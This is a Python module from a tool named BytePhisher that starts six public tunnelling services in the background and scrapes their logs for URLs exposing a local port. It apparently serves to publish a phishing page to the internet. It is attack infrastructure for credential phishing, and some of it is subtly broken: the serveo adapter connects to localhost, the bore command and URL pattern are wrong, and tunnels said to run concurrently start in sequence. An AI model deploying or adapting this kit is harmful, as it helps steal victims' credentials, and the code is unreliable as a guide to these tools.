# BytePhisher — 6-tunnel concurrent orchestration.
# Each tunneler adapter: ensure binary (auto-download if missing), start,
# parse its stdout for the public URL.
import os
import re
import shutil
import subprocess
import time
import sys

LOCAL_PORT_PLACEHOLDER = "{port}"

def _bg(cmd, log_path, cwd=None):
    log = open(log_path, "a")
    return subprocess.Popen(cmd, stdout=log, stderr=log, cwd=cwd or os.path.dirname(log_path))

def _wait_url(pattern, log_path, timeout=15):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if os.path.isfile(log_path):
            with open(log_path, encoding="utf-8", errors="replace") as f:
                m = re.search(pattern, f.read())
            if m:
                return m.group(1)
        time.sleep(1)
    return None

class Tunneler:
    name = "base"
    url_pattern = "(https://[-0-9a-z.]*)"

    def __init__(self, port):
        self.port = port
        self.log = os.path.join("logs", f"{self.name}.log")
        os.makedirs("logs", exist_ok=True)
        self.bin_path = None  # absolute path resolved in ensure_binary()

    def _resolve(self, names):
        """Find a binary on PATH; remember the absolute path."""
        for n in names:
            p = shutil.which(n)
            if p:
                self.bin_path = os.path.abspath(p)
                return True
        return False

    def ensure_binary(self):
        """Return True if the tunneler is usable; download if auto_download and missing."""
        raise NotImplementedError

    def start(self):
        """Launch tunneler; return public URL or None."""
        raise NotImplementedError

class Cloudflared(Tunneler):
    name = "cloudflared"
    url_pattern = r"(https://[-0-9a-z.]{4,}.trycloudflare.com)"
    BINARY = "cloudflared"
    DOWNLOADS = {
        "linux-amd64": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
        "linux-arm64": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64",
        "darwin-amd64": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64",
        "darwin-arm64": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64",
    }

    def _key(self):
        import platform
        arch = "arm64" if platform.machine() in ("arm64", "aarch64") else "amd64"
        osname = {"linux": "linux", "darwin": "darwin"}.get(sys.platform)
        return f"{osname}-{arch}"

    def ensure_binary(self):
        if self._resolve([self.BINARY]):
            return True
        # try auto-download into <project>/bin
        key = self._key()
        url = self.DOWNLOADS.get(key)
        if not url:
            return False
        print(f"[bytephisher] cloudflared not found — downloading {key} ...")
        import urllib.request
        bindir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "bin")
        os.makedirs(bindir, exist_ok=True)
        dst = os.path.abspath(os.path.join(bindir, "cloudflared"))
        try:
            urllib.request.urlretrieve(url, dst)
            os.chmod(dst, 0o755)
            self.bin_path = dst
            return True
        except Exception as e:
            print(f"[bytephisher] cloudflared download failed: {e}")
            return False

    def start(self):
        if not self.ensure_binary():
            return None
        _bg([self.bin_path, "tunnel", "--url", f"127.0.0.1:{self.port}"], self.log)
        return _wait_url(self.url_pattern, self.log, 20)

class Ngrok(Tunneler):
    name = "ngrok"
    url_pattern = r"(https://[0-9a-z-]+\.ngrok\.io)"
    BINARY = "ngrok"

    def ensure_binary(self):
        return self._resolve([self.BINARY])

    def start(self):
        if not self.ensure_binary():
            return None
        _bg([self.bin_path, "http", str(self.port)], self.log)
        return _wait_url(self.url_pattern, self.log, 20)

class LocalHostRun(Tunneler):
    name = "localhost_run"
    url_pattern = r"(https://[-0-9a-z.]+\.lhr\.life)"

    def ensure_binary(self):
        return self._resolve(["ssh"])

    def start(self):
        if not self.ensure_binary():
            return None
        _bg([self.bin_path, "-R", f"80:127.0.0.1:{self.port}", "nokey@localhost.run", "-T", "-n"], self.log)
        return _wait_url(self.url_pattern, self.log, 20)

class Serveo(Tunneler):
    name = "serveo"
    url_pattern = r"(https://[-0-9a-z.]+\.serveo\.net)"

    def ensure_binary(self):
        return self._resolve(["ssh"])

    def start(self):
        if not self.ensure_binary():
            return None
        _bg([self.bin_path, "-R", f"localhost:80:127.0.0.1:{self.port}", "localhost", "-N"], self.log)
        return _wait_url(self.url_pattern, self.log, 20)

class Bore(Tunneler):
    name = "bore"
    url_pattern = r"(https://[0-9a-z-]+\.[0-9a-z-]*\.bore\.local)"
    BINARY = "bore"

    def ensure_binary(self):
        if self._resolve([self.BINARY]):
            return True
        print("[bytephisher] bore not found — install: cargo install bore-cli (Linux only)")
        return False

    def start(self):
        if not self.ensure_binary():
            return None
        _bg([self.bin_path, "local", str(self.port), "-l", "0.0.0.0:80"], self.log)
        return _wait_url(self.url_pattern, self.log, 20)

class HopLink(Tunneler):
    name = "hoplink"
    url_pattern = r"(https://[-0-9a-z.]+\.hoplink\.com)"

    def ensure_binary(self):
        return self._resolve(["ssh"])

    def start(self):
        if not self.ensure_binary():
            return None
        _bg([self.bin_path, "-R", f"80:127.0.0.1:{self.port}", "hoplink.com", "-N"], self.log)
        return _wait_url(self.url_pattern, self.log, 20)

REGISTRY = {
    "cloudflared": Cloudflared,
    "ngrok": Ngrok,
    "localhost_run": LocalHostRun,
    "serveo": Serveo,
    "bore": Bore,
    "hoplink": HopLink,
}

def run_all(port):
    """Start every tunneler concurrently; return {name: url_or_None}."""
    results = {}
    for name, cls in REGISTRY.items():
        try:
            t = cls(port)
            results[name] = t.start()
        except Exception as e:
            print(f"[bytephisher] {name} failed: {e}")
            results[name] = None
    return results

def run_one(name, port):
    cls = REGISTRY.get(name)
    if not cls:
        return None
    return cls(port).start()
